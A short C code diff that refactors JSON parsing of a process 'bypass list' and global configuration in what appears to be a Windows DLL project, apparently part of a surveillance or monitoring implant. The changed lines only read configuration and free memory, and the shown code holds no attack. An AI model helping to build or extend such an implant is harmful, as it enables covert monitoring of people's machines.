@@ -1,7 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
 #include <cJSON/cJSON.h>
-//#include <json/JSON.h>
 #include "common.h"
 #include "bss.h"
 #include "H4-DLL.h"
@@ -110,10 +109,12 @@ void WINAPI ParseBypassCallback(cJSON* conf_json, DWORD dummy)
 	shared.process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
 
 	// Legge i processi rimanenti dal file di configurazione
-	for (index = 0; index < cJSON_GetArraySize(bypass_array); index++) {
-		cJSON* node = cJSON_GetArrayItem(bypass_array, index);
+	cJSON* node = NULL;
+	index = 0;
+	cJSON_ArrayForEach(node, bypass_array) {
 		const char* value = cJSON_GetStringValue(node);
 		_snprintf_s(shared.process_bypass_list[index + EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%s", value);
+		index++;
 	}
 }
 
@@ -142,8 +143,7 @@ static void setup_bypass_list()
 		}
 	}
 
-	delete value;
-
+	cJSON_Delete(value);
 }
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
